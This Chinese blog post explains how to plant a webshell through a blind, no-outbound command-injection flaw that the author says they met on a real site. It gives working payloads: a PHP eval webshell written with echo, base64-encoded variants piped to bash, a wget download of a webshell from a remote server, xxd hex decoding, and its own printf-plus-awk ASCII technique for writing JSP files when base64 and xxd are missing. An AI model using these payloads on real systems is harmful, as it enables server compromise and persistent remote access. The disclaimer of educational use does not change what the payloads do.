#  命令执行不出网、无回显、连基础工具base64/xxd都没有？极限生存下的命令执行，怎么打？   
原创 跟着斯叔唠安全  跟着斯叔唠安全   2025-05-08 06:01  
  
免责声明  
：  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
1  
  
Start  
  
    前端时间碰到一个站点，本身那个框架存在一个无回显的命令执行漏洞，平时验证的时候都是让它ping一下dnslog，但是那个站点执行ping动作后，dnslog没有一点反应，but执行payload的响应跟存在漏洞的响应返回非常相似，怀疑是个不出网的设备。漏洞的细节暂不公开，咱们今天主要聊聊极限环境下如何利用这个命令执行写入webshell。  
  
  
2  
  
Action  
  
    在搞之前咱们先回顾一下通常情况下的命令执行，我们如何写webshell呢？  
  
========================================================  
  
以下内容主要借鉴文章：  
https://developer.volcengine.com/articles/7381516634714079242  
  
========================================================  
1、echo直接写入  
```
echo '<?php eval($\_POST[1]); ?>' > 1.php
```  
  
直接写入webshell一般不会成功，因为webshell中使用的某些关键符号可能被转码或屏蔽  
  
2、  
base64写入  
```
echo "PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==" | base64 -d >2.php
```  
  
使用base64是比较通用的方法，完美去除了webshell本身的特殊字符  
  
3、  
绕过重定向符  
```
echo "ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE95QS9QZz09IiB8IGJhc2U2NCAtZCA+My5waHA=" | base64 -d | bash
```  
```
echo "ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE95QS9QZz09IiB8IGJhc2U2NCAtZCA+My5waHA=" | base64 -d | sh
```  
  
重定向符>不可用时，我们可以将1或2中的整体命令base64编码，然后解码后通过bash或sh执行，  
其他字符绕过方式，如空格对应${IFS}等  
  
4、  
远端下载webshell  
```
远端服务器放置webshell,开启http
python -m http.server

目标机器执行
wget http://xx.xx.xxx.xx:8000/xxx.php
```  
  
可出网且有wget的情况下可采用此方式  
  
5、  
hex写入  
  
hex写入与base64写入相似，在 https://www.107000.com/T-Hex/  
  
将webshell编码成hex，使用xxd命令还原  
  
或在使用前将webshell使用xxd生成hex数据  
```
echo '<?php eval($\_POST[1]); ?>' |xxd -ps
```  
  
然后命令注入执行  
```
echo 3C3F706870206576616C28245F504F53545B315D293B203F3E|xxd -r -ps > 5.php
```  
  
========================================================  
  
    常见的命令执行写webshell的方式如上所示，显然第4项直接pass，因为不出网。第一项echo直接写入，也限制住了，正如上文所说  
webshell中使用的某些关键符号可能被转码或屏蔽。能走的法子就剩下base64和xxd方式了。崩溃的是目标服务器上这两个命令都没有，可以说是相当的纯净。  
  
  
    那就没其他法子了吗？就只能放弃了吗？除了base64编码，hex编码，还能有啥编码方式呢？而且最好还是linux系统自带的，不需要借助其他工具就能解析的编码方式？  
  
  
    终于是，让我成功想到了一个不借助其他第三方工具，  
linux系统本身就能解析的一种编码方式，那就是--ASCII码！！！  
  
  
    思路有了，下面就是实践了。具体该怎么实操呢？假如，我们需要向1.jsp里面写入<%out.print("1");%>内容，那我们便可以在本机电脑上创建一个python脚本  
```
# 要处理的字符串
text = '<%out.print("1");%>'
# 打开文件以写入
with open('ascii_values.txt', 'w') as file:
    for char in text:
        # 写入每个字符的 ASCII 值，每行一个
        file.write(f"{ord(char)}\n")
```  
    结果长这样```
60
37
111
117
116
46
112
114
105
110
116
40
34
49
34
41
59
37
62
```  
  
    上面的就是每个字符串的ASCII码值，然后将上面的内容排列成这样的格式  
```
60\n37\n111\n117\n116\n46\n112\n114\n105\n110\n116\n40\n34\n49\n34\n41\n59\n37\n62\n
```  
  
    再在命令执行的地方输入payload  
```
printf "60\n37\n111\n117\n116\n46\n112\n114\n105\n110\n116\n40\n34\n49\n34\n41\n59\n37\n62\n" > /xxxxx/1.txt
```  
  
    这时候只是将它写入到了1.txt中了，下面就是将1.txt中的ASCII码内容处理成解码后的状态，再执行命令  
```
awk '{ printf "%c", $1 }' /xxxxx/1.txt > /xxxxx/1.jsp
```  
  
    如果不懂这是啥意思，可以请教一下GPT/Deepseek  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pKCicPnn24UbMzxvewrvh9MvTjx8TUAj4PI5R1cjqyQeiaCXjuSE8I3N3kWWfQ1CwTGJ3U46oJbmicwaNeXxQDr5w/640?wx_fmt=png&from=appmsg "")  
  
    至此，就成功将  
<%out.print("1");%>不借助任何第三方的工具写入到了web目录下的1.jsp文件中了  
  
    同样的照这个方式即可写入webshell文件。  
  
  
3  
  
End  
  
      
业务咨询/网络安全教学可添加主页微信咨询，欢迎打扰～  
  
      
  
  
  
  
  
